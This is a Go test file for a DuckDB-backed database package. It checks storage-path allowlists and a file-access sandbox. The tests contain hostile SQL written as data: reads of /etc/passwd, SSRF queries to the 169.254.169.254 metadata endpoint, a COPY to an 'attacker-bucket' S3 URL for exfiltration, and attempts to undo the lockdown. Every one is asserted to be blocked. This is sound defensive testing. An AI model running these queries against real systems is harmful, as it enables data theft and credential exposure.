package database

import (
	"context"
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"testing"

	"github.com/rs/zerolog"
)

// TestBuildAllowedDirectories verifies the pure-Go list assembly. Set-equality
// comparison (not order) because the helper's own doc-comment promises that
// the order is informational only — a future refactor reordering entries for
// readability must not regress the table.
func TestBuildAllowedDirectories(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		cfg  *Config
		want []string
	}{
		{
			name: "all empty produces empty list",
			cfg:  &Config{},
			want: nil,
		},
		{
			name: "local + spill + upload + compaction",
			cfg: &Config{
				LocalStorageRoot:        "/var/lib/arc/data",
				TempDirectory:           "/var/lib/arc/spill",
				UploadDir:               "/var/lib/arc/spill/arc-uploads",
				CompactionTempDirectory: "/var/lib/arc/compaction",
			},
			want: []string{
				"/var/lib/arc/data/",
				"/var/lib/arc/spill/",
				"/var/lib/arc/spill/arc-uploads/",
				"/var/lib/arc/compaction/",
			},
		},
		{
			name: "trailing slash preserved (idempotent)",
			cfg:  &Config{LocalStorageRoot: "/srv/arc/"},
			want: []string{"/srv/arc/"},
		},
		{
			name: "hot s3 bucket + prefix",
			cfg:  &Config{S3Bucket: "my-bucket", S3Prefix: "tenant-a/"},
			want: []string{"s3://my-bucket/tenant-a/"},
		},
		{
			name: "hot s3 bucket without prefix",
			cfg:  &Config{S3Bucket: "warehouse"},
			want: []string{"s3://warehouse/"},
		},
		{
			name: "leading-slash prefix is stripped",
			cfg:  &Config{S3Bucket: "my-bucket", S3Prefix: "/tenant-a"},
			want: []string{"s3://my-bucket/tenant-a/"},
		},
		{
			name: "double-leading-slash prefix is stripped (TrimLeft + path.Clean)",
			cfg:  &Config{S3Bucket: "my-bucket", S3Prefix: "//tenant-a"},
			want: []string{"s3://my-bucket/tenant-a/"},
		},
		{
			name: "interior double-slash in prefix is collapsed (path.Clean)",
			cfg:  &Config{S3Bucket: "my-bucket", S3Prefix: "tenant-a//sub"},
			want: []string{"s3://my-bucket/tenant-a/sub/"},
		},
		{
			name: "parent-traversal `..` in prefix falls back to bare bucket",
			cfg:  &Config{S3Bucket: "my-bucket", S3Prefix: ".."},
			want: []string{"s3://my-bucket/"},
		},
		{
			name: "parent-traversal `../escape` in prefix falls back to bare bucket",
			cfg:  &Config{S3Bucket: "my-bucket", S3Prefix: "../escape"},
			want: []string{"s3://my-bucket/"},
		},
		{
			name: "dot-only prefix falls back to bare bucket",
			cfg:  &Config{S3Bucket: "my-bucket", S3Prefix: "./"},
			want: []string{"s3://my-bucket/"},
		},
		{
			name: "hot + cold s3 distinct buckets",
			cfg: &Config{
				S3Bucket:     "hot",
				S3Prefix:     "p1",
				ColdS3Bucket: "cold",
				ColdS3Prefix: "p2",
			},
			want: []string{"s3://hot/p1/", "s3://cold/p2/"},
		},
		{
			name: "cold s3 same bucket and same prefix as hot deduplicated",
			cfg: &Config{
				S3Bucket:     "shared",
				S3Prefix:     "p",
				ColdS3Bucket: "shared",
				ColdS3Prefix: "p",
			},
			want: []string{"s3://shared/p/"},
		},
		{
			name: "cold s3 same bucket different prefix kept (full-URI dedup)",
			cfg: &Config{
				S3Bucket:     "warehouse",
				S3Prefix:     "hot",
				ColdS3Bucket: "warehouse",
				ColdS3Prefix: "cold",
			},
			want: []string{"s3://warehouse/hot/", "s3://warehouse/cold/"},
		},
		{
			name: "hot + cold azure distinct containers",
			cfg: &Config{
				AzureContainer:     "hot",
				ColdAzureContainer: "cold",
			},
			want: []string{"azure://hot/", "azure://cold/"},
		},
		{
			name: "no os.TempDir leak when only LocalStorageRoot is set",
			cfg:  &Config{LocalStorageRoot: "/var/lib/arc/data"},
			want: []string{"/var/lib/arc/data/"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := buildAllowedDirectories(tt.cfg)
			gotSorted := append([]string(nil), got...)
			wantSorted := append([]string(nil), tt.want...)
			sort.Strings(gotSorted)
			sort.Strings(wantSorted)
			if !slices.Equal(gotSorted, wantSorted) {
				t.Errorf("buildAllowedDirectories(%+v) = %v, want %v (set-equality)",
					tt.cfg, got, tt.want)
			}
		})
	}
}

// newSandboxFixture spins up a DuckDB with a real LocalStorageRoot under
// t.TempDir() and pre-populates a parquet file inside that root. Returns the
// DB plus the path of the inside-allowlist fixture so each sub-test can use
// them without re-building. Sub-tests share the same DB; they must not
// mutate sandbox state (e.g. attempting to re-set allowed_directories).
func newSandboxFixture(t *testing.T) (*DuckDB, string) {
	t.Helper()
	tmp := t.TempDir()
	storageRoot := filepath.Join(tmp, "data")
	if err := os.MkdirAll(storageRoot, 0o700); err != nil {
		t.Fatalf("mkdir storageRoot: %v", err)
	}
	cfg := &Config{
		MaxConnections:   4,
		MemoryLimit:      "256MB",
		LocalStorageRoot: storageRoot,
		TempDirectory:    tmp, // so spill/profile temp files land inside the sandbox
	}
	db, err := New(cfg, zerolog.Nop())
	if err != nil {
		t.Fatalf("database.New: %v", err)
	}
	t.Cleanup(func() { db.Close() })

	insidePath := filepath.Join(storageRoot, "fixture.parquet")
	createSQL := fmt.Sprintf("COPY (SELECT 1 AS x UNION ALL SELECT 2) TO '%s' (FORMAT PARQUET)", escapeSQLString(insidePath))
	if _, err := db.DB().ExecContext(context.Background(), createSQL); err != nil {
		t.Fatalf("COPY TO inside-allowlist path failed (sandbox setup wrong?): %v", err)
	}
	return db, insidePath
}

// TestSandbox is the CVE reproduction plus a full sweep of bypass attempts
// across the DuckDB I/O surface. Sub-tests share a single DB fixture and run
// SEQUENTIALLY (no t.Parallel() on subtests) because the "enforced on every
// pool connection" sub-test pins all MaxConnections=4 connections; a parallel
// sibling would deadlock waiting for a connection. Every sub-test is
// read-only against the post-lockdown sandbox state, so order does not
// affect outcomes — only the connection-pool contention prevents parallelism.
func TestSandbox(t *testing.T) {
	t.Parallel()
	db, insidePath := newSandboxFixture(t)
	ctx := context.Background()

	// Anything not in the allowlist. /etc is a stable not-temp not-storage
	// directory on every supported test host; the specific file does not
	// need to exist — the sandbox check fires at file-open before the
	// filesystem decides whether the path resolves.
	const outsidePath = "/etc/no_such_file_arc_sandbox_test"

	// Helper: assert the query errors with any error (the security guarantee
	// is the failure axis itself; the error message text varies across DuckDB
	// versions and is not part of the public contract).
	mustFail := func(t *testing.T, q, label string) {
		t.Helper()
		_, err := db.DB().QueryContext(ctx, q)
		if err == nil {
			t.Errorf("%s: query succeeded but sandbox should block it: %q", label, q)
		}
	}

	t.Run("baseline: read_parquet inside allowlist works", func(t *testing.T) {
		var n int
		if err := db.DB().QueryRowContext(ctx,
			fmt.Sprintf("SELECT COUNT(*) FROM read_parquet('%s')", escapeSQLString(insidePath)),
		).Scan(&n); err != nil {
			t.Fatalf("read_parquet allowed path: %v", err)
		}
		if n != 2 {
			t.Errorf("got %d rows from fixture, want 2", n)
		}
	})

	// CVE class — every I/O scalar/table function that takes a path. If
	// DuckDB adds new ones in a future release, the structural fix
	// (allowed_directories) covers them too — no test needs to be added
	// for each new function, but the existing sweep documents what we
	// explicitly verified against the current release.
	t.Run("io family blocked outside allowlist", func(t *testing.T) {
		for _, q := range []string{
			fmt.Sprintf("SELECT * FROM read_csv_auto('%s', header=false, columns={'l':'VARCHAR'}) LIMIT 1", outsidePath),
			fmt.Sprintf("SELECT * FROM read_csv('%s', header=false, columns={'l':'VARCHAR'}) LIMIT 1", outsidePath),
			fmt.Sprintf("SELECT * FROM read_json_auto('%s') LIMIT 1", outsidePath),
			fmt.Sprintf("SELECT * FROM read_json('%s', columns={'l':'VARCHAR'}) LIMIT 1", outsidePath),
			fmt.Sprintf("SELECT * FROM read_text('%s') LIMIT 1", outsidePath),
			fmt.Sprintf("SELECT * FROM read_blob('%s') LIMIT 1", outsidePath),
			"SELECT * FROM glob('/etc/*') LIMIT 1",
			fmt.Sprintf("SELECT * FROM parquet_metadata('%s') LIMIT 1", outsidePath),
			fmt.Sprintf("SELECT * FROM parquet_schema('%s') LIMIT 1", outsidePath),
			fmt.Sprintf("SELECT * FROM read_parquet('%s') LIMIT 1", outsidePath),
			// read_xlsx requires the excel community extension which is
			// neither installed nor loaded in this test setup. The query
			// must still fail — either the sandbox blocks file access or
			// the extension lookup errors — but it must NEVER succeed.
			fmt.Sprintf("SELECT * FROM read_xlsx('%s') LIMIT 1", outsidePath),
		} {
			mustFail(t, q, "io family")
		}
	})

	// `range(...)` is a pure scalar that does NOT touch the filesystem; it
	// should remain callable post-lockdown. Documents what the sandbox does
	// NOT block, so future contributors don't mistakenly add it to the
	// blocked list. (This is the inverse-test for the I/O family above.)
	t.Run("range is not gated by the sandbox", func(t *testing.T) {
		var n int
		if err := db.DB().QueryRowContext(ctx, "SELECT COUNT(*) FROM range(0, 100)").Scan(&n); err != nil {
			t.Fatalf("range(): %v", err)
		}
		if n != 100 {
			t.Errorf("range(0,100) returned %d rows, want 100", n)
		}
	})

	t.Run("ssrf via http/https blocked", func(t *testing.T) {
		// Even though httpfs may or may not be loaded (Arc loads it at
		// startup when S3 is configured), HTTP URLs are gated by the same
		// allowed_directories check. The link-local instance-metadata IP
		// is the standard cloud SSRF target.
		for _, q := range []string{
			"SELECT * FROM read_csv_auto('http://169.254.169.254/latest/meta-data/', header=false, columns={'l':'VARCHAR'}) LIMIT 1",
			"SELECT * FROM read_csv_auto('https://169.254.169.254/latest/meta-data/', header=false, columns={'l':'VARCHAR'}) LIMIT 1",
		} {
			mustFail(t, q, "ssrf")
		}
	})

	t.Run("COPY TO outside allowlist blocked", func(t *testing.T) {
		// COPY ... TO writes the file via the same OpenerFileSystem layer
		// that read_parquet uses; the sandbox catches it.
		_, err := db.DB().ExecContext(ctx,
			fmt.Sprintf("COPY (SELECT 1 AS x) TO '%s.parquet' (FORMAT PARQUET)", outsidePath),
		)
		if err == nil {
			t.Error("COPY TO outside allowlist succeeded — sandbox missed write path")
		}
	})

	t.Run("COPY TO s3 attacker bucket blocked", func(t *testing.T) {
		// The fixture's Config does not populate S3Bucket or ColdS3Bucket,
		// so no s3:// entries exist in the allowlist. A COPY ... TO an
		// arbitrary s3:// URL must be rejected the same way a local one is.
		_, err := db.DB().ExecContext(ctx,
			"COPY (SELECT 1 AS x) TO 's3://attacker-bucket/exfil.parquet' (FORMAT PARQUET)",
		)
		if err == nil {
			t.Error("COPY TO s3:// outside allowlist succeeded — sandbox missed S3 exfil path")
		}
	})

	t.Run("EXPORT DATABASE outside allowlist blocked", func(t *testing.T) {
		// EXPORT writes a directory of files. Even if the directory cannot
		// be created, the sandbox should reject the path before DuckDB
		// attempts to materialise it.
		_, err := db.DB().ExecContext(ctx, "EXPORT DATABASE '/etc/arc_sandbox_export_test'")
		if err == nil {
			t.Error("EXPORT DATABASE outside allowlist succeeded — sandbox missed export path")
		}
	})

	t.Run("INSTALL after lockdown blocked", func(t *testing.T) {
		// enable_external_access=false rejects new extension installs.
		_, err := db.DB().ExecContext(ctx, "INSTALL postgres_scanner")
		if err == nil {
			t.Error("INSTALL succeeded after lockdown — extension surface is reachable")
		}
	})

	t.Run("lockdown is one-way", func(t *testing.T) {
		// SET GLOBAL enable_external_access=true must be rejected at
		// runtime. DuckDB throws on the SET itself.
		_, err := db.DB().ExecContext(ctx, "SET GLOBAL enable_external_access = true")
		if err == nil {
			t.Error("SET enable_external_access=true succeeded — sandbox is not one-way")
		}
	})

	t.Run("enforced on every pool connection (distinct conns)", func(t *testing.T) {
		// Mirror the arcx test: hold N concurrent *sql.Conn so database/sql
		// is forced to open N distinct DuckDB connections, and run the CVE
		// reproduction against each. SET GLOBAL state is database-wide on
		// DuckDB, so this should always pass — the test documents the
		// invariant so a future regression to per-connection state fails
		// here loudly rather than silently shipping a sandbox that only
		// covers conn #1.
		const n = 4
		conns := make([]*sql.Conn, 0, n)
		defer func() {
			for _, c := range conns {
				_ = c.Close()
			}
		}()
		for i := range n {
			c, err := db.DB().Conn(ctx)
			if err != nil {
				t.Fatalf("iter %d: acquire conn: %v", i, err)
			}
			conns = append(conns, c)
		}
		for i, c := range conns {
			_, err := c.QueryContext(ctx,
				fmt.Sprintf("SELECT * FROM read_csv_auto('%s', header=false, columns={'l':'VARCHAR'}) LIMIT 1", outsidePath),
			)
			if err == nil {
				t.Errorf("conn %d: read_csv_auto outside allowlist succeeded — sandbox not enforced on this connection", i)
			}
		}
	})
}

// TestSandboxEmptyAllowlistLogsButDoesNotPanic documents the behaviour of
// `database.New(&Config{...minimal...})` with no LocalStorageRoot, no
// TempDirectory, no UploadDir, no S3/Azure — empty allowlist. The sandbox
// still locks down (DuckDB blocks all external access) and emits a Warn so
// misconfigured deployments fail fast and visibly.
func TestSandboxEmptyAllowlistLogsButDoesNotPanic(t *testing.T) {
	t.Parallel()
	cfg := &Config{MaxConnections: 1, MemoryLimit: "128MB"}
	db, err := New(cfg, zerolog.Nop())
	if err != nil {
		t.Fatalf("New with empty allowlist: %v", err)
	}
	defer db.Close()
	// File access against any path must fail.
	if _, err := db.DB().Query("SELECT * FROM read_parquet('/etc/passwd') LIMIT 1"); err == nil {
		t.Error("read_parquet on /etc/passwd succeeded — empty-allowlist sandbox did not lock down")
	}
}

// TestS3SecretNotReadable is the H3 regression: an S3 secret created via
// buildS3SecretSQL must NOT be readable through the query API. Before the fix,
// credentials were `SET GLOBAL s3_secret_access_key=…`, which any authenticated
// principal could read with `SELECT current_setting('s3_secret_access_key')`.
// Requires httpfs (registers the S3 secret type); skips if it can't be loaded
// (e.g. offline CI with no extension repo access).
func TestS3SecretNotReadable(t *testing.T) {
	ctx := context.Background()

	// Open a raw DuckDB (NOT the sandbox fixture): we need to INSTALL/LOAD
	// httpfs, which is blocked once enable_external_access=false. This mirrors
	// startup ordering (extensions load before lockdown).
	db, err := sql.Open("duckdb", "")
	if err != nil {
		t.Fatalf("open duckdb: %v", err)
	}
	defer db.Close()

	if _, err := db.ExecContext(ctx, "INSTALL httpfs"); err != nil {
		t.Skipf("httpfs unavailable (offline / cold extension cache): %v", err)
	}
	if _, err := db.ExecContext(ctx, "LOAD httpfs"); err != nil {
		t.Skipf("httpfs load failed: %v", err)
	}

	const secretVal = "SUPER-SECRET-KEY-do-not-leak"
	secretSQL := buildS3SecretSQL("AKIATEST", secretVal, "us-east-1", "", false, true)
	if _, err := db.ExecContext(ctx, secretSQL); err != nil {
		t.Fatalf("create S3 secret: %v", err)
	}

	// 1) current_setting() must NOT return the secret key. With the secret in
	//    the secrets manager (never SET GLOBAL), the setting is empty/NULL.
	var got sql.NullString
	if err := db.QueryRowContext(ctx,
		"SELECT current_setting('s3_secret_access_key')").Scan(&got); err != nil {
		t.Fatalf("current_setting query: %v", err)
	}
	if got.Valid && got.String == secretVal {
		t.Fatalf("SECURITY: secret key leaked via current_setting('s3_secret_access_key'): %q", got.String)
	}

	// 2) duckdb_secrets() must redact the secret value (it may show KEY_ID; the
	//    secret access key must not appear in the rendered secret_string).
	var name, secretString string
	if err := db.QueryRowContext(ctx,
		"SELECT name, secret_string FROM duckdb_secrets() WHERE name = '"+arcS3SecretName+"'").
		Scan(&name, &secretString); err != nil {
		t.Fatalf("duckdb_secrets query: %v", err)
	}
	if strings.Contains(secretString, secretVal) {
		t.Fatalf("SECURITY: secret key leaked via duckdb_secrets(): %q", secretString)
	}
}
